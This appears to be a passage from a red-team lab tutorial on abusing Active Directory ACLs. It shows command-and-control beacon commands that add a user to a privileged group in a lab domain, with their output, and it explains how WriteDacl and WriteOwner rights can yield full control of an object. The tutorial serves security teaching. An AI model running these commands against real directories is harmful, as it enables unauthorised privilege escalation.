If we have the ACL on a group, we can add and remove members.

```
beacon> run net group "Oracle Admins" bfarmer /add /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.

beacon> run net user bfarmer /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

User name                    bfarmer
Full Name                    Bob Farmer

[...snip...]

Global Group memberships     *Domain Users         *Roaming Users        
                             *Developers           *Oracle Admins
```

There are other interesting DACLs that can lead to similar abuses. For instance with **WriteDacl** you can grant **GenericAll** to any principal. With **WriteOwner**, you can change the ownership of the object to any principal which would then inherit GenericAll over it.